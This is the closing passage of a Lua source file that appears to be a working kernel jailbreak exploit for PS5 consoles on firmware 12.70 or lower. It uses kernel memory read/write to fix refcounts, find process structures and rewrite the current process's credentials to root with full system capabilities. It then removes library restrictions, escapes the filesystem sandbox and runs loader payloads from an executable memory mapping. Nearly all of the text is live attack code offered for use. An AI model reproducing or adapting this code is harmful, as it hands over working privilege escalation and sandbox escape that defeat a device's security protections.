        kwrite_slow(master_pipe_data, pipe_overwrite, 24)
    end
    if not verify_ok then return end
    print("karw success you can be happy now :) that you wasted 1 hour of energy on this")
    send_ps_notification("karw success you can be happy now :) that you wasted 1 hour of energy on this")

    -- Stage 3b: Cleanup

    local function bump_refcount(fp, delta)
        local rc = kernel.read_dword(fp + 0x28)
        printf("refcnt: %i", rc:tonumber())
        if rc:tonumber() > 0 and rc:tonumber() < 0x10000 then
            kernel.write_dword(fp + 0x28, rc + delta)
            return true
        end
        return false
    end

    local function null_socket_rthdr(fd)
        local fp = kernel.read_qword(fd_ofiles + fd * 0x30)
        if fp:tonumber() == 0 then return end
        local f_data = kernel.read_qword(fp)
        if f_data:tonumber() == 0 then return end
        local so_pcb = kernel.read_qword(f_data + 0x18)
        if so_pcb:tonumber() == 0 then return end
        local pktopts = kernel.read_qword(so_pcb + 0x120)
        if pktopts:tonumber() == 0 then return end
        kernel.write_qword(pktopts + 0x70, 0)
    end

    local master_rfp = kernel.read_qword(fd_ofiles + master_rfd * 0x30)
    local master_wfp = kernel.read_qword(fd_ofiles + master_wfd * 0x30)
    local victim_rfp = kernel.read_qword(fd_ofiles + victim_rfd * 0x30)
    local victim_wfp = kernel.read_qword(fd_ofiles + victim_wfd * 0x30)

    bump_refcount(master_rfp, 0x100)
    bump_refcount(master_wfp, 0x100)
    bump_refcount(victim_rfp, 0x100)
    bump_refcount(victim_wfp, 0x100)

    for i = 1, IPV6_SOCK_NUM do
        null_socket_rthdr(ipv6_socks[i])
    end

    -- close leftover free_fds
    -- their ucred cr_ref should be 0x0000000016002C00 from rthdr
    -- so it should be ok to close them
    for i = free_fd_idx, FREE_FDS_NUM do
        syscall.close(free_fds[i])
    end

    -- close ipv6 sockets
    for i = 1, IPV6_SOCK_NUM do syscall.close(ipv6_socks[i]) end

    -- close worker socketpairs
    syscall.close(iov_ss0); syscall.close(iov_ss1)
    syscall.close(uio_ss0); syscall.close(uio_ss1)

    -- release worker threads
    signal_workers(iov_workers)
    signal_workers(uio_read_workers)
    signal_workers(uio_write_workers)
    syscall.sched_yield()

    -- also based on luac0re
    local sigio_rfd, sigio_wfd = create_pipe()
    local our_pid = syscall.getpid():tonumber()
    local pid_buf = memory.alloc(4); memory.write_dword(pid_buf, our_pid)
    syscall.ioctl(sigio_rfd, 0x8004667C, pid_buf)

    local sigio_fp = kernel.read_qword(fd_ofiles + sigio_rfd * 0x30)
    local sigio_pipe = kernel.read_qword(sigio_fp)
    local pipe_sigio = kernel.read_qword(sigio_pipe + 0xD8) -- socket.so_sigio
    local curproc = kernel.read_qword(pipe_sigio) -- sigio.siu_proc ?
    printf("curproc: %x", curproc:tonumber())

    syscall.close(sigio_rfd); syscall.close(sigio_wfd)

    kernel.addr.curproc = curproc
    kernel.addr.curproc_fd = kernel.read_qword(kernel.addr.curproc + 0x48) -- p_fd (filedesc)
    kernel.addr.curproc_ofiles = kernel.read_qword(kernel.addr.curproc_fd) + 0x8
    printf("curproc_ofiles: %x", kernel.addr.curproc_ofiles:tonumber())

    -- taken from lapse.lua, modified to work without kernel data offsets
    function post_exploitation_ps5()
        local OFFSET_UCRED_CR_SCEAUTHID = 0x58
        local OFFSET_UCRED_CR_SCECAPS = 0x60
        local OFFSET_UCRED_CR_SCEATTRS = 0x83
        local OFFSET_P_UCRED = 0x40

        local SYSTEM_AUTHID = uint64("0x4800000000010003")
        local KDATA_MASK = uint64("0xFFFFFFFF00000000")

        -- taken from Gezine's BD-UN-JB Poops code
        local function find_allproc()
            local proc = kernel.addr.curproc

            while bit64.band(proc, KDATA_MASK) ~= KDATA_MASK do
                proc = kernel.read_qword(proc + 0x8)  -- proc->p_list->le_prev
                printf("proc: %x", proc:tonumber())
            end

            return proc
        end

        local function patch_dynlib_restriction(proc)

            local dynlib_obj_addr = kernel.read_qword(proc + 0x3e8)

            kernel.write_dword(dynlib_obj_addr + 0x118, 0) -- prot (todo: recheck)
            kernel.write_qword(dynlib_obj_addr + 0x18, 1) -- libkernel ref

            -- bypass libkernel address range check (credit @cheburek3000)
            kernel.write_qword(dynlib_obj_addr + 0xf0, 0) -- libkernel start addr
            kernel.write_qword(dynlib_obj_addr + 0xf8, -1) -- libkernel end addr

            local dynlib_eboot = kernel.read_qword(dynlib_obj_addr)
            local eboot_segments = kernel.read_qword(dynlib_eboot + 0x40)

            kernel.write_qword(eboot_segments + 0x08, 0)
            kernel.write_qword(eboot_segments + 0x10, -1)

        end

        local function get_root_vnode()
            local p = find_proc_by_pid(0) -- kernel pid
            local p_fd = kernel.read_qword(p + 0x48);
            local root_vnode = kernel.read_qword(p_fd + 0x8);
            return root_vnode;
        end

        local function escape_filesystem_sandbox(proc)
            local proc_fd = kernel.read_qword(proc + 0x48) -- p_fd
            local root_vnode = get_root_vnode()

            kernel.write_qword(proc_fd + 0x10, root_vnode) -- fd_rdir
            kernel.write_qword(proc_fd + 0x18, root_vnode) -- fd_jdir
        end

        local function patch_ucred(ucred, authid)

            kernel.write_dword(ucred + 0x04, 0) -- cr_uid
            kernel.write_dword(ucred + 0x08, 0) -- cr_ruid
            kernel.write_dword(ucred + 0x0C, 0) -- cr_svuid
            kernel.write_dword(ucred + 0x10, 1) -- cr_ngroups
            kernel.write_dword(ucred + 0x14, 0) -- cr_rgid

            -- escalate sony privs
            kernel.write_qword(ucred + OFFSET_UCRED_CR_SCEAUTHID, authid) -- cr_sceAuthID

            -- enable all app capabilities
            kernel.write_qword(ucred + OFFSET_UCRED_CR_SCECAPS, -1) -- cr_sceCaps[0]
            kernel.write_qword(ucred + OFFSET_UCRED_CR_SCECAPS + 8, -1) -- cr_sceCaps[1]

            -- set app attributes
            kernel.write_byte(ucred + OFFSET_UCRED_CR_SCEATTRS, 0x80) -- SceAttrs
        end

        local function escalate_curproc()

            local proc = kernel.addr.curproc

            local ucred = kernel.read_qword(proc + OFFSET_P_UCRED) -- p_ucred
            local authid = SYSTEM_AUTHID

            local uid_before = syscall.getuid():tonumber()
            local in_sandbox_before = syscall.is_in_sandbox():tonumber()

            printf("patching curproc %s (authid = %s)", hex(proc), hex(authid))

            patch_ucred(ucred, authid)
            patch_dynlib_restriction(proc)
            escape_filesystem_sandbox(proc)

            local uid_after = syscall.getuid():tonumber()
            local in_sandbox_after = syscall.is_in_sandbox():tonumber()

            printf("we root now? uid: before %d after %d", uid_before, uid_after)
            printf("we escaped now? in sandbox: before %d after %d", in_sandbox_before, in_sandbox_after)
        end

        local function spawn_payload()
            local pthread_create = fcall(dlsym(LIBKERNEL_HANDLE, "scePthreadCreate"))
            local pthread_join   = fcall(dlsym(LIBKERNEL_HANDLE, "scePthreadJoin"))

            local elfldr_savedata_path = string.format("/mnt/sandbox/%s_000/savedata0/elfldr-ps5.elf", get_title_id())
            local kexp_savedata_path = string.format("/mnt/sandbox/%s_000/savedata0/kexp.bin", get_title_id())

            local elfldr_path = ""
            if file_exists("/data/elfldr-ps5.elf") then
                elfldr_path = "/data/elfldr-ps5.elf"
            elseif file_exists(elfldr_savedata_path) then
                elfldr_path = elfldr_savedata_path
            else
                send_ps_notification("elfldr.elf not found in save data or /data/ path. Make sure it's there.")
                error("elfldr.elf not found in save data or /data/ path. Make sure it's there.")
            end

            local elfldr_data = file_read(elfldr_path)
            local elfldr_ptr = lua.resolve_value(elfldr_data)


            local kexp_path = ""
            if file_exists("/data/kexp.bin") then
                kexp_path = "/data/kexp.bin"
            elseif file_exists(kexp_savedata_path) then
                kexp_path = kexp_savedata_path
            else
                send_ps_notification("kexp.bin not found in save data or /data/ path. Make sure it's there.")
                error("kexp.bin not found in save data or /data/ path. Make sure it's there.")
            end

            local kexp_data = file_read(kexp_path)
            local kexp_aligned_size = align_to(#kexp_data, PAGE_SIZE)

            local PROT_RWX = bit32.bor(PROT_READ, PROT_WRITE, PROT_EXECUTE)
            local exec_fd = syscall.jitshm_create(0, kexp_aligned_size, PROT_RWX)
            local entry_addr = syscall.mmap(0, kexp_aligned_size, PROT_RWX, 0, exec_fd, 0)

            local kexp_addr = lua.resolve_value(kexp_data)
            memory.memcpy(entry_addr, kexp_addr, #kexp_data)
            printf("exec_fd: %i, entry_addr: %x", exec_fd:tonumber(), entry_addr:tonumber())


            local payload_args = memory.alloc(0x28)
            memory.write_dword(payload_args + 0x00, master_rfd)
            memory.write_dword(payload_args + 0x04, master_wfd)
            memory.write_dword(payload_args + 0x08, victim_rfd)
            memory.write_dword(payload_args + 0x0C, victim_wfd)
            memory.write_qword(payload_args + 0x10, kernel.addr.allproc)
            memory.write_qword(payload_args + 0x18, elfldr_ptr)
            memory.write_qword(payload_args + 0x20, #elfldr_data)

            local thr_handle_addr = memory.alloc(8)
            printf("pthread_create ret: %i", pthread_create(thr_handle_addr, 0, entry_addr, payload_args):tonumber())

            local ret_addr = memory.alloc(8)
            pthread_join(memory.read_qword(thr_handle_addr), ret_addr)

            printf("payloads_args_ret: %x", memory.read_qword(ret_addr):tonumber())
        end

        kernel.addr.allproc = find_allproc()

        -- patch current process creds
        escalate_curproc()

        -- needed for swapping sysent
        local proc_offsets = find_proc_offsets()
        kernel_offset.PROC_COMM = proc_offsets.PROC_COMM
        kernel_offset.PROC_SYSENT = proc_offsets.PROC_SYSENT

        -- spawn kexp, that does patch qa_flags and spawns elfldr
        run_with_ps5_syscall_enabled(spawn_payload)
    end

    -- restore main core
    pin_to_core(ORIG_MAIN_CORE)

    post_exploitation_ps5()
end

if PLATFORM ~= "ps5" or tonumber(FW_VERSION) > 12.70 then
    printf("this exploit only works on ps5 (fw <= 12.70) (current %s %s)", PLATFORM, FW_VERSION)
    send_ps_notification("this exploit only works on ps5 (fw <= 12.70) (current %s %s)", PLATFORM, FW_VERSION)
else
    if not file_exists("/savedata0/elfldr-ps5.elf") or not file_exists("/savedata0/kexp.bin") then
        error("update remote_lua_loader savedata")
    end

    p2jb()
end
